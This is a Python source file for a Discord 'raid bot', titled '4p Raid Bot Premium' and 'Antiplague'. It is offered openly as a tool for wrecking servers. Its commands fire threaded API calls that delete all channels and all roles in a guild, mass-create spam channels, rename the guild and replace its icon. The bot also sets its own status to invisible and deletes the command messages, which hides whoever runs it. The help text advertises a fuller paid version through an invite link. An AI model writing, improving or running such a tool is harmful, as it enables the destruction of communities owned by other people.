import os,logging,sys,aiohttp,time
from pystyle import Colors, Colorate

modules = ["discord", "discord.py", "requests", "pystyle"]
try:
    import discord
    import requests
    from pystyle import Colors, Colorate
except ImportError:
    print(Colorate.Horizontal(Colors.purple_to_blue, " [!] Checking if you have the modules installed. . .", 1, 0))
    for libraries in modules:
        os.system(f"pip install {libraries}")

from os import _exit
from time import sleep
import discord
from discord.ext import commands
import requests
import threading
import base64
import random
import json
from colorama import Fore, Back, Style

os.system("cls")


with open("config.json", "r") as jsonfile:
    data = json.load(jsonfile)

token = data["token"]
prefix = data["prefix"]
channel_names = data["channel_names"]
role_names = data["role_names"]
message_content = data["message_content"]
message_all = data["message_all"]



headers = {
    "Authorization": f"Bot {token}"
}


intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command("help")

if sys.platform == "win32":
	clear = lambda: os.system("cls")
else:
	clear = lambda: os.system("clear")

logging.basicConfig(
    level=logging.INFO,
    format= "\033[0;49;35m[\033[1;30;48m%(asctime)s\033[0;49;35m] \033[0m%(message)s",
    datefmt="%H:%M:%S",
)

sessions = requests.Session()

def menu():
	clear()
	logging.info(f"""                                                               
                                                         *%&&#,                               /%&&#.                 
                                                       @@@@@@@@@@@%                      .@@@@@@@@@@@%               
                                                     (@@@@@@@@@@@@@@@*                 %@@@@@@@@@@@@@@@,             
                                                    %@@@%   .%@@@@@@@@@/ ,.  ,..  ,. &@@@@@@@@@/   ,@@@@,            
                                                   /@@%        .@@@@@@@@@ *, ....,./@@@@@@@@&         @@@            
                                                   %@%           (@@@@@@@@....... #@@@@@@@@.           @@,           
                                                   /@             *@@@@@@@@,,,.,.#@@@@@@@@             ,@            
                                                   *,              *@@@%%@@@....*@@@#@@@@               &            
                                                  ..               .@( ,,. ((   @. .,  &%                (           
                                                                    .@#  * %/   @*.. ,&&                             
                                                                        ,@@@%  .@@@%                                 
                                                                         /%%%  ./%@.                                 
                                                                         .*/* (*.,%                                  
                                                                           .&@@@#.                                   


                                                             (     (           )   (    )    ) : 
                                                            (()    ))\        ()): )\  ((.  ())) 
                                                           (((_)  (((_)      (()))(_() ))\ ()(())
                                                           | | |  | '_ \    (/ __|(_)()(_))/ _` |
                                                          {Fore.BLACK}{Style.BRIGHT} |_  _| | .__/    | (_ | _` | ' \)__. |{Style.RESET_ALL}{Fore.RESET}
                                                          {Fore.MAGENTA}   |_|  |_|        \___|__/_|_||_|___/ {Fore.RESET}


                                               {Fore.MAGENTA}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮{Fore.RESET}
                                               {Fore.MAGENTA}│                                                                  │{Fore.RESET}
                                               {Fore.MAGENTA}│                        {Fore.WHITE}Command list:{Fore.RESET}                             {Fore.MAGENTA}│{Fore.RESET}
                                               {Fore.MAGENTA}│                                                                  │{Fore.RESET}
                                               {Fore.MAGENTA}│            {Fore.WHITE}.cdel, .rdel, .ccr (mount), .rename .changeicon{Fore.RESET}       {Fore.MAGENTA}│{Fore.RESET}
                                               {Fore.MAGENTA}│                                                                  │{Fore.RESET}
                                               {Fore.MAGENTA}│               {Fore.WHITE}for detailed information use .help{Fore.RESET}                 {Fore.MAGENTA}│{Fore.RESET}
                                               {Fore.MAGENTA}│         {Fore.WHITE}versión completa en: https://discord.gg/cgmsedcuec{Fore.RESET}       {Fore.MAGENTA}│{Fore.RESET}
                                               {Fore.MAGENTA}│                                                                  │{Fore.RESET}
                                               {Fore.MAGENTA}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯{Fore.RESET}


     \n\n""")
	logging.info(f"{Fore.MAGENTA}Client:{Fore.RESET} {bot.user}")
	logging.info(f"{Fore.MAGENTA}Prefix:{Fore.RESET} {prefix}")
	logging.info(f"{Fore.MAGENTA}Contributors:{Fore.RESET} YungSamy, gyazo")

os.system(f"title 4p Raid Bot Premium | v4")

@bot.event
async def on_ready():
	try:
		await bot.change_presence(status=discord.Status.invisible)
	except Exception:
		pass
	menu()

@bot.event
async def on_message(message):                    
      await bot.process_commands(message)

@bot.command(
  aliases=["start", "empezar"]
)
async def on(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)



def channel_deleter(channel_id):
    try:
        requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
    except:
        pass


def role_deleter(guild_id, role_id):
    try:
        requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers)
    except:
        pass


def channel_creater(guild_id):
    payload = {
        "name": channel_names,
        "permission_overwrites": [],
        "type": 0
    }
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=payload)
    except:
        pass


def change_guild_name(guild_id, name):
    payload = {
        "name": name
    }
    try:
        requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, json=payload)
    except:
        pass


def change_guild_icon(guild_id, url):
    encode = base64.b64encode(requests.get(url).content).decode()
    payload = {
        "icon": f"data:image/jpeg;base64,{encode}"
    }
    try:
        requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, json=payload)
    except:
        pass




@bot.command()
async def cdel(ctx):
    await ctx.message.delete()

    for channel in ctx.guild.channels:
        threading.Thread(target=channel_deleter, args=(channel.id,)).start()


@bot.command()
async def rdel(ctx):
    await ctx.message.delete()

    for role in ctx.guild.roles:
        threading.Thread(target=role_deleter, args=(ctx.guild.id, role.id,)).start()


@bot.command()
async def ccr(ctx, amount: int):
    await ctx.message.delete()

    for i in range(amount):
        threading.Thread(target=channel_creater, args=(ctx.guild.id,)).start()



@bot.command()
async def rename(ctx, *, name):
    await ctx.message.delete()

    change_guild_name(ctx.guild.id, name)


@bot.command()
async def changeicon(ctx, url):
    await ctx.message.delete()

    change_guild_icon(ctx.guild.id, url)



@bot.command()
async def help(ctx):
    await ctx.message.delete()

    embed = discord.Embed(
        title="Antiplague bot commands free:",
        color=0x810df2,

        description=f"""
    
    `{prefix}cdel` - Delete all Channels
    `{prefix}rdel` - Delete all Roles
    `{prefix}ccr <amount>` - Create Channels
    `{prefix}rename <name>` - Change Guild Name
    `{prefix}changeicon <icon_url>` - Change Guild Icon


        Para la versión con todos los comandos y más funciones, únete a nuestro servidor de Discord:
        - https://discord.gg/cgmsedcuec
        """,

    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1562585159495192707/1562585184446976120/banner_antiplague_2.png")
    await ctx.send(embed=embed)


bot.run(token)